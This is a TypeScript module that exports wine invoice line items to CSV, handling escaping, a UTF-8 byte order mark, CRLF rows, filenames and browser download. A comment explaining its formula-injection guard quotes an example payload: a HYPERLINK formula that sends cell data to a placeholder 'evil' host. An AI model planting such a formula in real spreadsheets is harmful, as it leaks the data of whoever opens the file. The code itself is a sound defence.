import type { LineItem, ScanSource } from "./types";

const HEADERS = [
  "Wine",
  "Producer",
  "Vintage",
  "Varietal",
  "Region",
  "Quantity",
  "Unit cost (USD)",
  "Line total (USD)",
  "Confidence",
] as const;

// Characters Excel/Sheets/LibreOffice will interpret as the start of a
// formula when they appear in the first position of a cell. A malicious
// supplier name like `=HYPERLINK("http://evil/?"&A1,"click")` would
// otherwise execute on open. Prefixing a single quote neutralizes it
// while remaining visually identical in the imported sheet.
const FORMULA_LEAD = /^[=+\-@\t\r]/;

// UTF-8 byte order mark. Excel uses it as the signal to decode the file
// as UTF-8 instead of the OS-default code page, which keeps producer
// and region names like "Ch\u00e2teau" or "R\u00fcdesheim" from arriving
// as mojibake.
const BOM = "\ufeff";

// RFC 4180 specifies CRLF as the line separator, and Excel-on-Windows
// silently drops rows that use bare LF. Use CRLF so exported files open
// correctly in every common spreadsheet client.
const ROW_SEP = "\r\n";

function escape(value: string | number | null): string {
  if (value === null || value === undefined) return "";
  let s = String(value);
  if (FORMULA_LEAD.test(s)) s = `'${s}`;
  if (/[",\r\n]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

export function toCsv(items: LineItem[]): string {
  const rows = items.map((it) =>
    [
      it.name,
      it.producer,
      it.vintage ?? "NV",
      it.varietal,
      it.region,
      it.qty,
      it.unitCost.toFixed(2),
      (it.qty * it.unitCost).toFixed(2),
      it.confidence.toFixed(2),
    ]
      .map(escape)
      .join(","),
  );
  return BOM + [HEADERS.join(","), ...rows].join(ROW_SEP);
}

export function csvFilename(source: ScanSource): string {
  const date = source.parsedAt.slice(0, 10);
  const slug = source.distributor.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "");
  return `terroir-${date}-${slug}.csv`;
}

export function downloadCsv(filename: string, csv: string) {
  const blob = new Blob([csv], { type: "text/csv;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  a.style.display = "none";
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}
